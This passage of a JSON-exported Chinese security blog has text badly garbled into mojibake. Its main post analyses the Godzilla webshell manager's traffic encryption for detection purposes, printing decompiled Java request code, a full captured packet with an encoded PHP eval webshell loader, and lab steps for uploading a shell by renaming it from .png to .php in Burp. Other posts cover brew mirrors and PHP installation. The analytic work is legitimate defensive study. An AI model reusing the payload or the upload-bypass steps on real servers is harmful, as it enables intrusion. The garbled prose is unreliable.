*/ fillParameter(className, funcName, parameter);/* 101 */ byte[] data = parameter.formatEx();/* 102 */ if (this.gzipDecodeMagic == 1) &#123;/* 103 */ data = functions.gzipE(data);/* */ &#125;/* */ /* 106 */ byte[] result = this.http.sendHttpResponse(data).getResult();/* 107 */ if ((this.gzipEncodeMagic == -1 || this.gzipEncodeMagic == 1) &amp;&amp; functions.isGzipStream(result)) &#123;/* 108 */ result = functions.gzipD(result);/* */ &#125;/* 110 */ return result;/* */ &#125;/* */ å¯¹sendHttpResponseç›¸å…³çš„æ•°æ®åŒ…è¯·æ±‚æ–¹æ³•è¿›è¡Œåˆ†æä»£ç è·¯å¾„ï¼šutil/http/Http.java 12345678910111213/* */ public HttpResponse sendHttpResponse(Map&lt;String, String&gt; header, byte[] requestData, int connTimeOut, int readTimeOut) &#123;/* 84 */ requestData = this.shellContext.getCryptionModule().encode(requestData);/* */ /* 86 */ String left = this.shellContext.getReqLeft();/* 87 */ String right = this.shellContext.getReqRight();/* 88 */ if (this.shellContext.isSendLRReqData()) &#123;/* 104 */ byte[] leftData = left.getBytes();/* 105 */ byte[] rightData = right.getBytes();/* 106 */ requestData = (byte[])functions.concatArrays(functions.concatArrays(leftData, 0, ((leftData.length &gt; 0) ? leftData.length : 1) - 1, requestData, 0, requestData.length - 1), 0, leftData.length + requestData.length - 1, rightData, 0, ((rightData.length &gt; 0) ? rightData.length : 1) - 1);/* */ &#125; /* */ /* 109 */ return SendHttpConn(this.shellContext.getUrl(), this.requestMethod, header, requestData, connTimeOut, readTimeOut, this.proxy);/* */ &#125; è¯¥æ®µä»£ç è°ƒç”¨äº†getCryptionModule()å¯¹è¯·æ±‚æ•°æ®è¿›è¡Œäº†åŠ å¯†ï¼Œåé¢å¯¹æ•°æ®éƒ¨åˆ†è¿›è¡Œäº†å‰¥ç¦»ï¼Œåˆ é™¤äº†åŠ åœ¨çœŸå®æ•°æ®å·¦å³ä¸¤è¾¹çš„å†—æ‚æ•°æ®ï¼ˆshellè®¾å®šæ—¶æ·»åŠ çš„å¤šä½™æ•°æ®ï¼‰ åŠ å¯†å‡½æ•°åˆ†æencodeè·¯å¾„shells/cryptions/phpXor/PhpEvalXor.java 12345678910111213141516/* */ public byte[] encode(byte[] data) &#123;/* */ try &#123;/* 57 */ return E(data);/* 58 */ &#125; catch (Exception e) &#123;/* 59 */ Log.error(e);/* 60 */ return null;/* */ &#125; /* */ &#125;/* */ public byte[] E(byte[] cs) &#123;/* 87 */ int len = cs.length;/* 88 */ for (int i = 0; i &lt; len; i++) &#123;/* 89 */ cs[i] = (byte)(cs[i] ^ this.key[i + 1 &amp; 0xF]);/* */ &#125;/* 91 */ return (String.format(&quot;%s=%s&amp;&quot;, new Object[] &#123; this.pass, this.evalContent &#125;) + this.shell.getSecretKey() + &quot;=&quot; + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();/* */ &#125; evalContentçš„å†…å®¹æ˜¯ï¼šğŸ‘‡ 12345678/* */ public String generateEvalContent() &#123;/* 112 */ String eval = (new String(Generate.GenerateShellLoder(this.shell.getSecretKey(), functions.md5(this.shell.getSecretKey()).substring(0, 16), false))).replace(&quot;&lt;?php&quot;, &quot;&quot;);/* 113 */ eval = functions.base64EncodeToString(eval.getBytes());/* 114 */ eval = (new StringBuffer(eval)).reverse().toString();/* 115 */ eval = String.format(&quot;eval(base64_decode(strrev(urldecode(&#x27;%s&#x27;))));&quot;, new Object[] &#123; URLEncoder.encode(eval) &#125;);/* 116 */ eval = URLEncoder.encode(eval);/* 117 */ return eval;/* */ &#125; æ‰€ä»¥æœ€ç»ˆå‘é€çš„æ•°æ®åŒ…æ˜¯æ‹¼æ¥çš„ï¼Œå†…å®¹æ˜¯ï¼špasswordå¯†ç =evalContent + å¯†é’¥key + = + å¯¹è¦å‘é€çš„æ•°æ®å…ˆbase64ç¼–ç ï¼Œå†è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå†urlç¼–ç  å¯†ç å’Œå¯†é’¥éƒ½æ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œâ€&#x3D;â€œ ä¹Ÿæ˜¯æ˜æ–‡ä¼ è¾“ å…¶ä¸­evalContentçš„å†…å®¹æ ¼å¼æ˜¯ï¼š å…ˆåœ¨GenerateShellloderä¸­å¯»æ‰¾&lt;?phpå¹¶ç”¨&quot; &quot;æ›¿æ¢æ‰ï¼Œä¹Ÿå°±æ˜¯åˆ é™¤&quot;&lt;?php&quot;çš„åŠŸèƒ½ï¼Œ ç„¶åé€å­—èŠ‚è·å–evalçš„å†…å®¹è¿›è¡Œbase64ç¼–ç åå†è½¬æ¢ä¸ºstringç±»å‹çš„ã€‚ å¯¹evalå…ˆè¿›è¡Œencodeå‡½æ•°åŠ å¯†ï¼ˆæŒ‰ä½å¼‚æˆ–ï¼‰ï¼Œå†è¿›è¡Œurlç¼–ç ï¼Œå¾—åˆ°çš„æ•°æ®æ”¾å…¥åˆ°æ ¼å¼eval(base64_decode(strrev(urldecode(&#39;%s&#39;))));ä¸­ï¼Œ%sä¸ºè¦å¡«å…¥æ•°æ®çš„ä½ç½®ã€‚ å°†ç¬¬3æ­¥è·å¾—çš„æ•°æ®ï¼Œæœ€ç»ˆè¿›è¡Œencodeå‡½æ•°åŠ å¯†ï¼ˆæŒ‰ä½å¼‚æˆ–ï¼‰ï¼Œå†è¿›è¡Œurlç¼–ç ã€‚æœ€ç»ˆå¾—åˆ°çš„æ˜¯evalContent æœ€åæ•°æ®åŒ…çš„å†…å®¹ï¼Œæ ¹æ®evalFuncå¯ä»¥å‘ç°ï¼Œåœ¨æ•°æ®åŒ…å‘é€å‡ºå»ä¹‹åï¼Œè¿˜è¿›è¡Œäº†gzipçš„å‹ç¼©ï¼ˆè·¯å¾„ shells/payloads/php/PhpShell.javaï¼‰ã€‚æ‰€ä»¥è¦å…ˆå¯¹æ•°æ®è¿›è¡Œgzipè§£å‹ç¼©ï¼Œå†æ‰€æœ‰æ•°æ®è¿›è¡Œè§£å¯† 1234567891011121314/* */ public byte[] evalFunc(String className, String funcName, ReqParameter parameter) &#123;/* 100 */ fillParameter(className, funcName, parameter);/* 101 */ byte[] data = parameter.formatEx();/* 102 */ if (this.gzipDecodeMagic == 1) &#123;/* 103 */ data = functions.gzipE(data);/* */ &#125;/* */ /* 106 */ byte[] result = this.http.sendHttpResponse(data).getResult();/* 107 */ if ((this.gzipEncodeMagic == -1 || this.gzipEncodeMagic == 1) &amp;&amp; functions.isGzipStream(result)) &#123;/* 108 */ result = functions.gzipD(result);/* */ &#125;/* 110 */ return result;/* */ &#125;/* */ æ•°æ®åŒ…ï¼š 1passwd=eval%28base64_decode%28strrev%28urldecode%28%27%253DoQD9pQD9BCIgAiCN0HIgACIgACIgoQD7kSeltGJsEGdhRGJoUGZvNmbl1TXl1WYORWYvxWehBHJb50TJN1UFN1XkACIgACIgACIgACIgoQD7lSZzxWYm1TPhkiIvZmbJN3YpNXYCRXZnJCLhRXYkRCKz9GcyR3coAiZpBCIgACIgACIK0welNHbl1HIgACIK0wOpYTMskSeltGJuM3chBHJoUDZthic0NnY1NHIvh2YlBCIgACIgACIK0wOpkSeltGJskSY0FGZkgib1JHQoUGZvNmblhSZk92YuV2X0YTZzFmYg8GajVGIgACIgACIgoQD7kiNxwCMskSeltGJuM3chBHJoUDZthic0NnY1NHIvh2YlBCIgACIgACIK0wOpQWYvxWehBHJowWY2VWCJoQD9BCIgACIgACIK0wOpkXZrRCLkF2bslXYwRCKlR2bj5WZ9QWYvxWehBHJgACIgACIgACIgACIK0wepU2csFmZ90TPpIybm5WSzNWazFmQ0V2ZiwCZh9Gb5FGckgycvBnc0NHKgYWagACIgACIgAiCNsTK5V2akwSXl1WYORWYvxWehBHJb50TJN1UFN1XkgSZk92YuVWPkF2bslXYwRCIgACIgACIgoQD7lSKdVWbh5EZh9Gb5FGckslTPl0UTV0UfRCK0V2czlGKgYWagACIgoQD7kSeltGJskSXzNXYwRyWUN1TQ9FJoUGZvNWZk9FN2U2chJGKlR2bj5WZ9EGdhRGJgACIgoQD7lSKdN3chBHJbR1UPB1XkgCdlN3cphCImlmCNszJ1czY5IjYjJjNwM2NjNDOwcSP5V2akoQD7cCZh9Gb5FGcn0TZtFmTkF2bslXYwRiCNszJk1Welt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&amp;keymd=VVYXXwxUeFMOBzA9Yzc1RF1AFw%3D%3D æœ€ç»ˆè§£å¯†æµç¨‹ï¼š 12è®¡ç®—å‡º md5 (pass + key), å¯¹å“åº”åŒ…æˆªå–è¯¥md5åçš„å‰16ä½ä»¥åŠå16ä½ å¯¹æˆªå–åçš„å“åº”åŒ…å†…å®¹è¿›è¡Œ base64è§£ç  + aesè§£å¯† + gzipè§£å‹ç¼© å‚è€ƒæ–‡ç« https://xz.aliyun.com/t/10556","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"æµé‡åˆ†æ","slug":"Webå®‰å…¨/æµé‡åˆ†æ","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[],"author":"Gryffinbit"},{"title":"brew updateå¡ä½çš„è§£å†³","slug":"brew-updateå¡ä½çš„è§£å†³","date":"2022-12-22T10:45:27.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/12/22/brew-updateå¡ä½çš„è§£å†³/","permalink":"https://gryffinbit.top/2022/12/22/brew-update%E5%8D%A1%E4%BD%8F%E7%9A%84%E8%A7%A3%E5%86%B3/","excerpt":"","text":"å…ˆæ›´æ–°ä¸‹brewæœ‰æ—¶brewç‰ˆæœ¬å¤ªæ—§ä¹Ÿä¼šæœ‰é—®é¢˜ 1/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; å†æ›´æ–°å›½å†…æº1234567891011#æ›´æ–°Homebrewcd &quot;$(brew --repo)&quot;git remote set-url origin https://mirrors.ustc.edu.cn/brew.git#æ›´æ–°Homebrew-corecd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-core&quot;git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git#æ›´æ–°Homebrew-caskï¼ˆæœ€é‡è¦çš„ä¸€æ­¥ï¼Œå¾ˆå¤šæ›´æ–°å®Œå›½å†…æºä¾ç„¶å¡å°±æ˜¯æ²¡æ›´æ–°è¿™ä¸ªï¼‰cd &quot;$(brew --repo)&quot;/Library/Taps/homebrew/homebrew-caskgit remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git æ›´æ–°HOMEBREW_BOTTLE_DOMAINæœ€é‡è¦ ä½¿ç”¨zshçš„ç”¨æˆ· 12echo &#x27;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles/&#x27; &gt;&gt; ~/.zshrcsource ~/.zshrc ä½¿ç”¨bashçš„ç”¨æˆ· 12echo &#x27;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles/&#x27; &gt;&gt; ~/.bash_profilesource ~/.bash_profile æ›´æ–°åº“12brew update-reset brew update å¦‚æœå¡ä½çš„è¯ï¼Œç›´æ¥è¿›è¡Œå‡çº§ 1brew upgrade","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[],"author":"Gryffinbit"},{"title":"macOS13 é€šè¿‡brewå®‰è£…ä¸åŒç‰ˆæœ¬çš„PHP","slug":"macOS13-é€šè¿‡brewå®‰è£…ä¸åŒç‰ˆæœ¬çš„PHP","date":"2022-12-22T10:37:50.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/12/22/macOS13-é€šè¿‡brewå®‰è£…ä¸åŒç‰ˆæœ¬çš„PHP/","permalink":"https://gryffinbit.top/2022/12/22/macOS13-%E9%80%9A%E8%BF%87brew%E5%AE%89%E8%A3%85%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84PHP/","excerpt":"","text":"å®‰è£…å®‰è£…å¤šä¸ª PHP ç‰ˆæœ¬ã€‚é¦–å…ˆï¼Œä¸è¦ä¸º PHP ä½¿ç”¨é»˜è®¤çš„è‡ªåˆ¶è½¯ä»¶æ ¸å¿ƒ tapã€‚ä½¿ç”¨shivammathur&#x2F;phpã€‚ 12brew tap shivammathur/phpbrew install shivammathur/php/php@8.0 ç„¶åå°†PHP8.0è®¾ç½®ä¸ºé»˜è®¤PHPCLIç‰ˆæœ¬ 12brew unlink phpbrew link --overwrite --force php@8.0 https://kevdees.com/install-nginx-multiple-php-versions-on-macos-13-ventura/","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"macOS13","slug":"macOS13","permalink":"https://gryffinbit.top/tags/macOS13/"}],"author":"Gryffinbit"},{"title":"å“¥æ–¯æ‹‰v1.0åŠ å¯†åˆ†æåŠç‰¹å¾æµé‡æå–","slug":"å“¥æ–¯æ‹‰V1.0åŠ å¯†åˆ†æåŠç‰¹å¾æµé‡æå–","date":"2022-12-19T10:20:47.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/12/19/å“¥æ–¯æ‹‰V1.0åŠ å¯†åˆ†æåŠç‰¹å¾æµé‡æå–/","permalink":"https://gryffinbit.top/2022/12/19/%E5%93%A5%E6%96%AF%E6%8B%89V1.0%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90%E5%8F%8A%E7%89%B9%E5%BE%81%E6%B5%81%E9%87%8F%E6%8F%90%E5%8F%96/","excerpt":"","text":"å“¥æ–¯æ‹‰ç®€ä»‹å“¥æ–¯æ‹‰ï¼Œä»–æ˜¯ç»§èœåˆ€ã€èšå‰‘ã€å†°èä¹‹åå…·æœ‰æ›´å¤šä¼˜ç‚¹çš„Webshellç®¡ç†å·¥å…·ï¼Œç”±javaè¯­è¨€å¼€å‘ï¼Œå¦‚åç§°ä¸€æ ·ï¼Œä»–çš„â€œå‡¶çŒ›â€ä¹‹å¤„ä¸»è¦ä½“ç°åœ¨ï¼š å…¨éƒ¨ç±»å‹çš„shellèƒ½ç»•è¿‡å¸‚é¢å¤§éƒ¨åˆ†çš„é™æ€æŸ¥æ€ æµé‡åŠ å¯†èƒ½ç»•è¿‡è¿‡å¸‚é¢ç»å¤§éƒ¨åˆ†çš„æµé‡Waf Godzillaè‡ªå¸¦çš„æ’ä»¶æ˜¯å†°èã€èšå‰‘ä¸èƒ½æ¯”æ‹Ÿçš„ å®ƒèƒ½å®ç°çš„åŠŸèƒ½é™¤äº†ä¼ ç»Ÿçš„å‘½ä»¤æ‰§è¡Œã€æ–‡ä»¶ç®¡ç†ã€æ•°æ®åº“ç®¡ç†ä¹‹å¤–ï¼Œæ ¹æ®shellç±»å‹çš„ä¸åŒè¿˜åŒ…æ‹¬äº†ï¼šMSFè”åŠ¨ã€ç»•è¿‡OpenBasedir åŠ å¯†æµé‡æå–æ€è·¯ç‰¹å¾è¯†åˆ«äº’è”ç½‘é€šè®¯åè®®ä¼—å¤šï¼Œä¸åŒçš„åº”ç”¨é€šå¸¸ä¼šé‡‡ç”¨ä¸åŒçš„åè®®ï¼Œè€Œå„ç§åè®®éƒ½æœ‰å…¶ç‰¹æ®Šçš„æŒ‡çº¹ï¼Œè¿™äº›æŒ‡çº¹å¯èƒ½æ˜¯ç‰¹å®šçš„ç«¯å£ã€ç‰¹å®šçš„å­—ç¬¦ä¸²æˆ–è€…ç‰¹å®šçš„æ¯”ç‰¹åºåˆ—ã€‚åŸºäºç‰¹å¾çš„è¯†åˆ«æŠ€æœ¯ï¼Œæ­£æ˜¯é€šè¿‡è¯†åˆ«æ•°æ®æŠ¥æ–‡ä¸­çš„æŒ‡çº¹ä¿¡æ¯æ¥ç¡®å®šä¸šåŠ¡æ‰€æ‰¿è½½çš„åº”ç”¨ä»¥åŠè¯¥åº”ç”¨æ˜¯å¦å­˜åœ¨å¼‚å¸¸ã€‚ å¦‚é€šè¿‡ç‰¹å¾æŒ‡çº¹è¯†åˆ«å¸¸è§çš„çš„é»‘å®¢å·¥å…·ï¼Œå¦‚èœåˆ€ã€èšå‰‘ã€å†°èã€Godzillaç­‰webshellå·¥å…·çš„é€šè®¯ï¼›Regeorgã€Tunnaã€Frpã€EarthWormç­‰ç½‘ç»œç©¿é€å·¥å…·çš„é€šè®¯ï¼›CobaltStrikeã€MSFç­‰æ¸—é€å·¥å…·çš„é€šè®¯ã€‚ åœ¨åŠ å¯†æµé‡æ£€æµ‹ä¸Šå¯ä»¥é€šè¿‡å¯¹åŠ å¯†æ¡æ‰‹è¿‡ç¨‹ä¸­äº§ç”Ÿçš„JA3æŒ‡çº¹ï¼ŒSNIä¿¡æ¯ï¼Œè¯ä¹¦é¢å‘è€…ç­‰ä¿¡æ¯ï¼Œåšç‰¹å¾åŒ¹é…ï¼Œç²¾å‡†è¯†åˆ«åˆ°APTç»„ç»‡ä¸­ä½¿ç”¨çš„ç‰¹ç§æœ¨é©¬æˆ–åŸºäºæ¡†æ¶ç”Ÿæˆçš„å•†ä¸šæœ¨é©¬ï¼Œå‘ç°å†…ç½‘å¤±é™·èµ„äº§ã€‚ éšè”½ä¿¡é“éšè”½ä¿¡é“å¯ä»¥åˆ†ä¸ºä½¿ç”¨æœªçŸ¥åè®®ä¸åˆ©ç”¨å·²çŸ¥åè®®ä¸¤ç§ã€‚ ä½¿ç”¨æœªçŸ¥åè®®çš„éšè”½ä¿¡é“æ£€æµ‹é€šè¿‡å¯¹ç½‘ç»œå±‚ã€åº”ç”¨å±‚åè®®çš„åŒ¹é…åˆ†æï¼Œå¯¹å¸¸è§ç«¯å£ä¸‹çš„æ•°æ®ä¼ è¾“è¿›è¡Œåè®®ä½ç‰¹å¾çš„åŒ¹é…ï¼Œé€‰æ‹©å¤šç§ç‰¹å¾ä½è¿›è¡Œæ•°æ®åŒ¹é…ï¼Œå½“æ‰€æœ‰åŒ¹é…ç‰¹å¾éƒ½æ— æ³•åŒ¹é…è¯¥ç«¯å£ä¸‹çš„é€šè®¯æ•°æ®ï¼Œåˆ™è®¤ä¸ºé€šè®¯ä¸æ˜¯è¯¥ç«¯å£è¯¥è¿è¡Œçš„åè®®ï¼Œå³ä¸ºç½‘ç»œéšè”½ä¿¡é“é€šä¿¡ã€‚ å¯¹äºåˆ©ç”¨å·²çŸ¥åè®®æ­£å¸¸ä¸šåŠ¡å­—æ®µçš„è¿›è¡Œéšè”½é€šä¿¡éƒ¨åˆ†ï¼Œå¯ä»¥é¦–å…ˆæŒ‰ç…§åè®®å¯¹æµé‡è¿›è¡Œåˆ†ç±»è§£æï¼Œç„¶åé’ˆå¯¹ä¸æ¯ç§åè®®è¿›è¡Œå­—æ®µåˆ’åˆ†ï¼Œç‰¹å¾æå–ï¼Œç»Ÿè®¡å»ºæ¨¡ï¼Œæ¯”å¦‚DNSéš§é“ï¼ŒAPTç»„ç»‡ç»å¸¸ä½¿ç”¨DNSéš§é“æ¥å¯¹æœ¨é©¬è¿›è¡ŒæŒ‡ä»¤ä¸‹å‘æ•°æ®ä¼ è¾“ç­‰æ§åˆ¶ï¼Œåƒµå°¸ç½‘ç»œä½¿ç”¨DGAä¸Šçº¿ç­‰ã€‚ å“¥æ–¯æ‹‰è½¯ä»¶å®‰è£…åŠä½¿ç”¨å®‰è£…é¡¹ç›®åœ°å€ï¼šhttps://github.com/BeichenDream/Godzilla/releases ä¸‹è½½.jar æ–‡ä»¶ è¿è¡Œï¼š 1java -jar godzilla.jar é¶åœºæ”»å‡» phpæ­å»ºçš„ç½‘ç«™å’Œjspæ­å»ºç½‘ç«™ï¼šapache æœåŠ¡å™¨ä¸€èˆ¬ä½¿ç”¨PHPæ­å»ºã€‚tomcat æœåŠ¡å™¨ä¸€èˆ¬ä½¿ç”¨jspæ­å»ºã€‚ æœ¨é©¬æ˜¯è¦åœ¨æœåŠ¡å™¨ä¸Šè‡ªåŠ¨æ‰§è¡Œï¼Œæ‰§è¡Œè„šæœ¬ï¼Œæ‰€ä»¥æœ¨é©¬æ ¼å¼è¦ä¸æœåŠ¡å™¨çš„è¯­è¨€ä¿æŒä¸€è‡´ã€‚æ¯”å¦‚phpçš„ç½‘ç«™ï¼Œè¦ç”¨phpçš„æœ¨é©¬ã€‚ è®¿é—®ç½‘ç«™index.phpï¼Œå¯ä»¥çœ‹å‡ºæ˜¯phpç½‘ç«™ï¼Œç”Ÿæˆphpçš„é©¬ ä½¿ç”¨uploadçš„é¶åœº 123docker search upload-labsdocker image pull c0ny1/upload-labsdocker run -d -p 80:8080 c0ny1/upload-labs ä½¿ç”¨å“¥æ–¯æ‹‰ç”Ÿæˆä¸€ä¸ªæœ¨é©¬ ä¿®æ”¹æœ¨é©¬åç¼€ æ”¹ä¸º.pngï¼Œä¸Šä¼ ï¼ŒåŒæ—¶ç”¨burpæ‹¦æˆªï¼Œæ”¹åŒ…ï¼Œæ”¹æˆ.phpå†å‘é€ æ£€æŸ¥ä¸€ä¸‹ï¼Œç¡®å®å·²ç»ä¸Šä¼  å“¥æ–¯æ‹‰è¿æ¥ ç›®æ ‡åœ°å€ï¼šhttp://ip:8080/upload/test.php è¿æ¥æˆåŠŸ åç¼–è¯‘è·å¾—æºç JD-GUI åç¼–è¯‘ä¸‹è½½å·¥å…· https://jd-gui.apponic.com/mac/ M1 ç³»ç»ŸæŠ¥é”™ï¼š è§£å†³æ–¹æ¡ˆ1ï¼š å³é”®JD-GUIï¼Œæ˜¾ç¤ºåŒ…å†…å®¹ è¿›å…¥Contents/MacOSæ–‡ä»¶å¤¹ï¼Œæ‰“å¼€universalJavaApplicationStub.shæ–‡ä»¶ï¼Œä½¿ç”¨æ–°ç‰ˆçš„æ–‡ä»¶æ›¿æ¢ï¼Œæ–°ç‰ˆæ–‡ä»¶å†…å®¹å¯ä»¥åœ¨å¦‚ä¸‹åœ°å€å¤åˆ¶ https://raw.githubusercontent.com/tofi86/universalJavaApplicationStub/master/src/universalJavaApplicationStub è§£å†³æ–¹æ¡ˆ2ï¼š å³é”®JD-GUI.app æ˜¾ç¤ºåŒ…å†…å®¹ï¼Œæ‰“å¼€info.plistã€‚ ä¿®æ”¹ç¬¬149è¡Œï¼ŒæŠŠ1.8+æ”¹æˆ1.8å³å¯ã€‚ 1&lt;key&gt;JVMVersion&lt;/key&gt; &lt;string&gt;1.8&lt;/string&gt; åŒå‡»æ‰“å¼€è½¯ä»¶ï¼Œå°†éœ€è¦åç¼–è¯‘çš„jaråŒ…æ‹–åˆ°è½¯ä»¶ç•Œé¢ä¸­ é€‰ä¸­å…¨éƒ¨æ–‡ä»¶ï¼Œç‚¹å‡»File-Save All Sourcesä¿å­˜åç¼–è¯‘å®Œçš„æºç ï¼Œé€‰æ‹©ä¿å­˜è·¯å¾„ æ•´ä½“åˆ†ææµç¨‹æ¦‚è¿°å“¥æ–¯æ‹‰å…¨å¥—çš„æ”»å‡»æµç¨‹ åœ¨å®¢æˆ·ç«¯ç”Ÿæˆshellï¼Œç”Ÿæˆshellçš„æ—¶å€™å¯ä»¥è®¾ç½®å‚æ•°ï¼ŒåŒ…æ‹¬ï¼šå¯†ç ã€å¯†é’¥ã€æœ‰æ•ˆè½½è·ã€åŠ å¯†å™¨ æœ‰æ•ˆè½½è·åˆ†ä¸ºjavaã€phpã€c#ä¸‰ç§ç±»å‹çš„payload åŠ å¯†å™¨åˆ†ä¸ºbase64å’Œrawä¸¤å¤§ç±»ã€‚å…¶ä¸­javaçš„åŠ å¯†æ–¹å¼æ˜¯é€šè¿‡AESåŠ å¯†ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šå†è¿›è¡Œbase64ç¼–ç ï¼ˆbase64ï¼‰ï¼Œæˆ–ç›´æ¥AESåŠ å¯†å®Œçš„æ•°æ®ï¼ˆrawï¼‰ã€‚C#çš„åŠ å¯†æ–¹å¼æ˜¯é€šè¿‡AESåŠ å¯†ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šå†è¿›è¡Œbase64ç¼–ç ï¼ˆbase64ï¼‰ï¼Œæˆ–ç›´æ¥AESåŠ å¯†å®Œçš„åŸæ•°æ®ï¼ˆrawï¼‰ã€‚PHPçš„åŠ å¯†æ–¹å¼æ˜¯åŸå§‹æ•°æ®å’Œå¯†é’¥çš„md5å€¼çš„å‰16ä½æŒ‰ä½å¼‚æˆ–ï¼Œç„¶åå†è¿›è¡Œbase64çš„ç¼–ç ï¼ˆbase64ï¼‰ã€‚æˆ–ç›´æ¥è¿›è¡Œå¼‚æˆ–ï¼ˆrawï¼‰ ç”Ÿæˆshell.phpï¼ˆæ–‡ä»¶åå¯è‡ªå®šä¹‰ï¼Œæ ¹æ®é€‰æ‹©çš„æœ‰æ•ˆè½½è·ä¸åŒï¼Œå¯ä»¥æœ‰jspã€phpã€aspxç­‰æ–‡ä»¶æ ¼å¼ï¼‰ï¼Œè¯¥shell.phpéœ€è¦ä¸Šä¼ åˆ°æ”»å‡»çš„ç›®æ ‡ä¸»æœºä¸Šã€‚ è¿™ä¸ªæ–‡ä»¶ï¼Œä¼šå‡ºç°åœ¨æ•°æ®åŒ…çš„POSTè¯·æ±‚ä¸­ã€‚ è¯¥æ–‡ä»¶ä¼šå°†å¯†ç ã€å¯†é’¥çš„md5å€¼å‰16ä½æ˜æ–‡å†™å…¥ã€‚ è¯¥æ–‡ä»¶çš„å®ç°åŠŸèƒ½è¿˜æœ‰ï¼šå°†å¯†ç å’Œå¯†é’¥è¿›è¡Œæ‹¼æ¥ï¼Œç„¶åè¿›è¡Œmd5çš„è®¡ç®—ã€‚ä¸€å…±32ä½ã€‚æœåŠ¡å™¨ç«¯è¿”å›æ•°æ®çš„æ—¶å€™ï¼Œä¼šè¿›è¡Œæ‹¼æ¥ã€‚å³æœåŠ¡å™¨ç«¯è¿”å›æ•°æ® &#x3D; md5å‰16ä½+åŠ å¯†æ•°æ®+md5å16ä½ã€‚ï¼ˆåŠ å¯†æ•°æ®å¯ä»¥é€šè¿‡å¯¹æœåŠ¡å™¨ç«¯çš„è§£å¯†ç®—æ³•è¿›è¡Œè§£å¯†ï¼‰ å“¥æ–¯æ‹‰å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥ URLæ˜¯ç›®æ ‡ä¸»æœºä¸Šçš„shell.php è¯·æ±‚é…ç½®çš„å‚æ•°ï¼Œå¯ä»¥æ·»åŠ å†—ä½™æ•°æ®ï¼Œè¯¥å†—ä½™æ•°æ®ä¼šåœ¨æ•°æ®çš„æ­£å¼å†…å®¹çš„å‰åæ·»åŠ è¿›å»ã€‚ è¿æ¥æˆåŠŸåï¼Œè¿›å…¥shellä¾¿å¯ä»¥è¿›è¡Œæ“ä½œã€‚ æ•°æ®åŒ…åˆ†æ åœ¨å“¥æ–¯æ‹‰å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥çš„æ—¶å€™ï¼Œä¼šæœ‰ä¸€æ­¥æµ‹è¯•è¿æ¥çš„è¿‡ç¨‹ã€‚ä¸€å…±äº§ç”Ÿä¸‰ä¸ªæ•°æ®åŒ…ï¼š ç¬¬ä¸€ä¸ªæ•°æ®åŒ…ä¼šå°†shells/payloads/php/assets/payload.phpçš„å†…å®¹å‘é€è¿‡å»ã€‚è¯¥æ–‡ä»¶å®šä¹‰äº†shellæ‰€æœ‰åŠŸèƒ½æ‰€éœ€çš„ä¸€ç³»åˆ—å‡½æ•°ï¼Œå“¥æ–¯æ‹‰ç¬¬ä¸€æ¬¡è¿æ¥shellæ—¶ï¼Œå°†è¿™äº›å‡½æ•°å®šä¹‰å‘é€ç»™æœåŠ¡å™¨å¹¶å­˜å‚¨åœ¨sessionä¸­ï¼Œåç»­çš„shellæ“ä½œåªéœ€è¦å‘é€å‡½æ•°åç§°ä»¥åŠå¯¹åº”çš„å‡½æ•°å‚æ•°å³å¯ã€‚ ç¬¬äºŒã€ä¸‰æ•°æ®åŒ…å†…å®¹ä¸€æ ·ï¼Œè§£å¯†åçš„å†…å®¹ä¸ºmethodName=testã€‚è¯¥æ•°æ®åŒ…çš„å«ä¹‰æ˜¯å°†payload.phpä¸­çš„å‡½æ•°åä¼ å…¥ã€‚å®ƒä¼šå®ç°payload.phpä¸­testå‡½æ•°çš„åŠŸèƒ½ è¿›å…¥shellä¹Ÿä¼šäº§ç”Ÿå’Œæµ‹è¯•è¿æ¥æ—¶ç›¸åŒçš„æ•°æ®åŒ…ã€‚ä¸»è¦éƒ½æ˜¯ç¬¬ä¸€ä¸ªæ•°æ®åŒ…æ˜¯å‘é€payload.phpçš„å†…å®¹ã€‚åé¢çš„æ•°æ®åŒ…æ˜¯ä¼ 